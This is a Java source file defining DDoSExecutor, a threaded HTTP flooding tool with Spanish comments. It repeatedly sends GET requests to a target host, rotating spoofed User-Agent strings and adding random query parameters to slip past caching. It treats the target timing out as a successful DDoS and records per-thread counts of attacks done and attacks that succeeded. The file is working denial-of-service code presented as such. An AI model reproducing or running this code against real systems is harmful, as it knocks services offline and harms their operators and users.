package com.arquitecsoft.util;

import com.arquitecsoft.controller.Main;
import com.arquitecsoft.model.AttributeClass;
import com.arquitecsoft.model.DDoSReportModel;
import com.google.gson.Gson;
import kong.unirest.Unirest;
import org.apache.logging.log4j.Logger;
import kong.unirest.HttpResponse;

import java.util.Random;
import java.util.stream.IntStream;

public class DDoSExecutor implements Runnable {
    public final static Logger log = Main.LOG;
    private String host;
    private long cantIntentos;      // cantidad de intentos al host
    private long tiempoEjecucion;   // tiempo en milisegundos de lo que dura el ataque
    private int[] codigosExcluidos; // Codigos de error por los cuales salir (ej 301, 502...)
    private String fileLogs;

    public DDoSExecutor() {
    }

    public DDoSExecutor(String host, long cantIntentos, long tiempoEjecucion, int[] codigosExcluidos, String fileLogs) {
        this.host = host;
        this.cantIntentos = cantIntentos;
        this.tiempoEjecucion = tiempoEjecucion;
        this.codigosExcluidos = codigosExcluidos;
        this.fileLogs = fileLogs;
    }

    @Override
    public void run() {
        long pid = Thread.currentThread().getId();
        long tiempoInicio = System.currentTimeMillis();
        long tiempoEjecutando = 0;
        long ciclos = 0;
        int response = -1;
        String responseText = "";
        String msg = "";
        boolean exitoso = false;
        if (cantIntentos > 0 || tiempoEjecucion > 0) {
            Random r = new Random();
            String letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            String[] agents = {"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
                    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
                    "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
                    "Opera/9.20 (Windows NT 6.0; U; en)",
                    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0"
                    };
            int sizeLetters = letters.length();
            int sizeAgents = agents.length;
            while (true) {
                ciclos++;
                boolean imprimir = ciclos % 10 == 0;
                boolean terminar;
                try {
                    HttpResponse<String> transferHttpResponse = Unirest.get(this.host)
                            .header("User-Agent", agents[r.nextInt(sizeAgents)])
                            .queryString(letters.charAt(r.nextInt(sizeLetters))+"", letters.charAt(r.nextInt(sizeLetters))+"")
                            .asString();
                    response = transferHttpResponse.getStatus();
                    responseText = transferHttpResponse.getBody();
                    if (imprimir) {
                        log.info("Response status:" + response);
                    }
                    int finalResponse = response;
                    terminar = IntStream.of(codigosExcluidos).anyMatch(x -> x == finalResponse);
                    if (terminar) {
                        tiempoEjecutando = (System.currentTimeMillis() - tiempoInicio);
                        msg = "[OK] HTTP Status " + response + ", no se continúa... exit(" + pid + ")";
                        log.info(msg);
                        exitoso = true;
                        break;
                    }
                } catch (Exception e) {
                    if (e.getMessage().contains("org.apache.http.conn.ConnectTimeoutException")) {
                        // DDoS Exitoso / Servicio no disponible
                        response = 0;
                        responseText = "";
                        tiempoEjecutando = (System.currentTimeMillis() - tiempoInicio);
                        long tiempoMinutos = tiempoEjecutando / 1000 / 60;
                        msg = "[OK] Servicio destino no responde (Scripting ejeuctado dutrante " + tiempoMinutos + "min [" + tiempoEjecutando + "ms], " + ciclos + " ciclos)... exit(" + pid + ")";
                        log.info(msg);
                        exitoso = true;
                        break;
                    } else {

                        if (imprimir) {
                            log.info("Peticion cancelada: " + e.getMessage());
                        }
                    }
                }
//                log.info("response.status="+response);

                // Validar si debería continuar el while o no
                if (this.cantIntentos > 0 && ciclos >= this.cantIntentos) {
                    // DDoS Fallido
                    tiempoEjecutando = (System.currentTimeMillis() - tiempoInicio);
                    msg = "[Fail] Cantidad de intentos alcanzado (" + ciclos + ")... exit(" + pid + ")";
                    log.info(msg);
                    break;
                }

                if (this.tiempoEjecucion > 0 && this.tiempoEjecucion < (System.currentTimeMillis() - tiempoInicio)) {
                    // DDoS Fallido
                    tiempoEjecutando = tiempoEjecucion;
                    long tiempoMinutos = tiempoEjecucion / 1000 / 60;
                    msg = "[Fail] Cantidad de tiempo alcanzado (" + tiempoMinutos + "min, " + ciclos + " ciclos)... exit(" + pid + ")";
                    log.info(msg);
                    break;
                }
            }
        } else {
            msg = "pid=" + pid + " no iniciado debido a que intentos y/o tiempo de ejecucion no están definidos";
            log.info(msg);
        }

        saveResults(pid, msg, response, responseText, tiempoEjecutando, ciclos, exitoso);
    }

    private void saveResults(long pid, String msg, int response, String responseText, long tiempoEjecutando, long ciclos, boolean exitoso) {
        String json = "{}";
        WriteAndReadFile files = new WriteAndReadFile();
        try {
            json = files.Read(this.fileLogs);
        } catch (Exception ignored) {}

        Gson g = new Gson();
        DDoSReportModel salida = g.fromJson(json, DDoSReportModel.class);

        // Asignar el último código http de este hilo
        boolean existe = false;
        for (AttributeClass att : salida.getFinalCodes()) {
            if(String.valueOf(pid).equals(att.getKey())) {
                existe = true;
                att.setValue(String.valueOf(response));
                break;
            }
        }
        if (!existe) {
            salida.getFinalCodes().add(new AttributeClass(String.valueOf(pid), String.valueOf(response)));
        }

        // Asignar el mensaje de response del servidor objetivo para este hilo
        existe = false;
        for (AttributeClass att : salida.getFinalResponses()) {
            if(String.valueOf(pid).equals(att.getKey())) {
                existe = true;
                att.setValue(responseText);
                break;
            }
        }
        if (!existe) {
            salida.getFinalResponses().add(new AttributeClass(String.valueOf(pid), responseText));
        }

        // Asignar el mensaje de respuesta de este hilo
        existe = false;
        for (AttributeClass att : salida.getFinalMgs()) {
            if(String.valueOf(pid).equals(att.getKey())) {
                existe = true;
                att.setValue(msg);
                break;
            }
        }
        if (!existe) {
            salida.getFinalMgs().add(new AttributeClass(String.valueOf(pid), msg));
        }

        // Asignar el tiempo ejecutado de este hilo
        existe = false;
        for (AttributeClass att : salida.getFinalTimes()) {
            if(String.valueOf(pid).equals(att.getKey())) {
                existe = true;
                att.setValue(String.valueOf(tiempoEjecutando));
                break;
            }
        }
        if (!existe) {
            salida.getFinalTimes().add(new AttributeClass(String.valueOf(pid), String.valueOf(tiempoEjecutando)));
        }

        // Asignar la cantidad de ciclos ejecutados de este hilo
        existe = false;
        for (AttributeClass att : salida.getFinalCicles()) {
            if(String.valueOf(pid).equals(att.getKey())) {
                existe = true;
                att.setValue(String.valueOf(ciclos));
                break;
            }
        }
        if (!existe) {
            salida.getFinalCicles().add(new AttributeClass(String.valueOf(pid), String.valueOf(ciclos)));
        }

        // Sumar los ciclos
        long attacksDone = salida.getAttacksCountTotalDone() + ciclos;
        salida.setAttacksCountTotalDone(attacksDone);

        // Sumar 1 si es exitoso
        if (exitoso) {
            long attacksSuccess = salida.getAttacksCountTotalSuccess() + 1;
            salida.setAttacksCountTotalSuccess(attacksSuccess);

            // Agregar codigo de hilo EXITOSO al final
            existe = false;
            for (long pidGuardado : salida.getAttacksSuccess()) {
                if(pid == pidGuardado) {
                    existe = true;
                    break;
                }
            }
            if (!existe) {
                salida.getAttacksSuccess().add(pid);
            }
        }

        try {
            files.Write(this.fileLogs + "." + pid, g.toJson(salida));
        } catch (Exception e) {
            log.error("No se ha podido guardar el json final: " + g.toJson(salida), e);
        }

    }

    public String getHost() {
        return host;
    }

    public void setHost(String host) {
        this.host = host;
    }

    public long getCantIntentos() {
        return cantIntentos;
    }

    public void setCantIntentos(long cantIntentos) {
        this.cantIntentos = cantIntentos;
    }

    public long getTiempoEjecucion() {
        return tiempoEjecucion;
    }

    public void setTiempoEjecucion(long tiempoEjecucion) {
        this.tiempoEjecucion = tiempoEjecucion;
    }

    public int[] getCodigosExcluidos() {
        return codigosExcluidos;
    }

    public void setCodigosExcluidos(int[] codigosExcluidos) {
        this.codigosExcluidos = codigosExcluidos;
    }
}
